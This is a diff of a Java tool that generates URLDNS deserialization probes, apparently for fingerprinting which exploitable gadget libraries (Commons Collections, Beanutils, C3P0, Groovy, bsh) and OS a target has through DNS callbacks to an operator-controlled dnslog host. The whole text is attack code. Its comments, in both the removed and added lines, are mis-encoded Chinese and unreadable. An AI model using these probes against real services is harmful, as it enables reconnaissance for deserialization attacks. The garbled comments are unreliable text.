@@ -16,7 +16,8 @@ public class en {
 	static String dnslog;
 	static String[] defaultclass = {"CommonsCollections13567",
   				"CommonsCollections24",
-  				"CommonsBeanutils2","C3P0",
+  				"CommonsBeanutils2",
+				"C3P0",
   				"AspectJWeaver",
   				"bsh",
   				"Groovy",
@@ -84,21 +85,21 @@ public class en {
     public static  void setlist(String clazzName) throws Exception{
     	switch (clazzName) {
 		case "CommonsCollections13567":
-	    	//CommonsCollections1/3/5/6/7Á´,ÐèÒª<=3.2.1°æ±¾
+	    	//CommonsCollections1/3/5/6/7é“¾,éœ€è¦<=3.2.1ç‰ˆæœ¬
 	    	HashMap cc31321 = getURLDNSgadget("http://cc31321."+dnslog, "org.apache.commons.collections.functors.ChainedTransformer");
 	    	HashMap cc322 = getURLDNSgadget("http://cc322."+dnslog, "org.apache.commons.collections.ExtendedProperties$1");
 	  		list.add(cc31321);
 	  		list.add(cc322);
 			break;
 		case "CommonsCollections24":
-	    	//CommonsCollections2/4Á´,ÐèÒª4-4.0°æ±¾
+	    	//CommonsCollections2/4é“¾,éœ€è¦4-4.0ç‰ˆæœ¬
 	    	HashMap cc40 = getURLDNSgadget("http://cc40."+dnslog,  "org.apache.commons.collections4.functors.ChainedTransformer");
 	    	HashMap cc41 = getURLDNSgadget("http://cc41."+dnslog,  "org.apache.commons.collections4.FluentIterable");
 	  		list.add(cc40);
 	  		list.add(cc41);
 			break;
 		case "CommonsBeanutils2":
-	    	//CommonsBeanutils2Á´,serialVersionUID²»Í¬,1.7x-1.8xÎª-3490850999041592962,1.9xÎª-2044202215314119608
+	    	//CommonsBeanutils2é“¾,serialVersionUIDä¸åŒ,1.7x-1.8xä¸º-3490850999041592962,1.9xä¸º-2044202215314119608
 			HashMap cb17 = getURLDNSgadget("http://cb17."+dnslog, "org.apache.commons.beanutils.MappedPropertyDescriptor$1");
 	    	HashMap cb18x = getURLDNSgadget("http://cb18x."+dnslog, "org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry");
 	    	HashMap cb19x = getURLDNSgadget("http://cb19x."+dnslog, "org.apache.commons.beanutils.BeanIntrospectionData");
@@ -107,19 +108,19 @@ public class en {
 	  		list.add(cb19x);
 			break;
 		case "C3P0":
-	    	//c3p0£¬serialVersionUID²»Í¬,0.9.2pre2-0.9.5pre8Îª7387108436934414104,0.9.5pre9-0.9.5.5Îª7387108436934414104
+	    	//c3p0ï¼ŒserialVersionUIDä¸åŒ,0.9.2pre2-0.9.5pre8ä¸º7387108436934414104,0.9.5pre9-0.9.5.5ä¸º7387108436934414104
 	    	HashMap c3p092x = getURLDNSgadget("http://c3p092x."+dnslog, "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
 	    	HashMap c3p095x = getURLDNSgadget("http://c3p095x."+dnslog, "com.mchange.v2.c3p0.test.AlwaysFailDataSource");
 	  		list.add(c3p092x);
 	  		list.add(c3p095x);
 			break;
 		case "AspectJWeaver":
-	    	//AspectJWeaver,ÐèÒªcc31
+	    	//AspectJWeaver,éœ€è¦cc31
 	    	HashMap ajw = getURLDNSgadget("http://ajw."+dnslog, "org.aspectj.weaver.tools.cache.SimpleCache");
 	  		list.add(ajw);
 			break;
 		case "bsh":
-	  		//bsh,serialVersionUID²»Í¬,2.0b4Îª4949939576606791809,2.0b5Îª4041428789013517368,2.0.b6ÎÞ·¨·´ÐòÁÐ»¯
+	  		//bsh,serialVersionUIDä¸åŒ,2.0b4ä¸º4949939576606791809,2.0b5ä¸º4041428789013517368,2.0.b6æ— æ³•ååºåˆ—åŒ–
 	  		HashMap bsh20b4 = getURLDNSgadget("http://bsh20b4."+dnslog, "bsh.CollectionManager$1");
 	  		HashMap bsh20b5 = getURLDNSgadget("http://bsh20b5."+dnslog, "bsh.engine.BshScriptEngine");
 	  		HashMap bsh20b6 = getURLDNSgadget("http://bsh20b6."+dnslog, "bsh.collection.CollectionIterator$1");
@@ -128,7 +129,7 @@ public class en {
 	  		list.add(bsh20b6);
 			break;
 		case "Groovy":
-	  		//Groovy,1.7.0-2.4.3,serialVersionUID²»Í¬,2.4.xÎª-8137949907733646644,2.3.xÎª1228988487386910280
+	  		//Groovy,1.7.0-2.4.3,serialVersionUIDä¸åŒ,2.4.xä¸º-8137949907733646644,2.3.xä¸º1228988487386910280
 	  		HashMap groovy1702311 = getURLDNSgadget("http://groovy1702311."+dnslog, "org.codehaus.groovy.reflection.ClassInfo$ClassInfoSet");
 	  		HashMap groovy24x = getURLDNSgadget("http://groovy24x."+dnslog, "groovy.lang.Tuple2");
 	  		HashMap groovy244 = getURLDNSgadget("http://groovy244."+dnslog, "org.codehaus.groovy.runtime.dgm$1170");
@@ -147,7 +148,7 @@ public class en {
 	  		list.add(Jdk7u21);
 			break;
 		case "winlinux":
-	  		//windows/linux°æ±¾ÅÐ¶Ï
+	  		//windows/linuxç‰ˆæœ¬åˆ¤æ–­
 	  		HashMap linux = getURLDNSgadget("http://linux."+dnslog, "sun.awt.X11.AwtGraphicsConfigData");
 	  		HashMap windows = getURLDNSgadget("http://windows."+dnslog, "sun.awt.windows.WButtonPeer");
 	  		list.add(linux);
@@ -181,7 +182,7 @@ public class en {
   		try {
   			hashMap.put(url, makeClass(clazzName));
 		} catch (Exception e) {
-			System.out.println("´íÎó£¡£¡£¡²»ÄÜÒÔjava¿ªÍ·");
+			System.out.println("é”™è¯¯ï¼ï¼ï¼ä¸èƒ½ä»¥javaå¼€å¤´");
 			System.out.println(e);
 		}
   		f.set(url, -1);
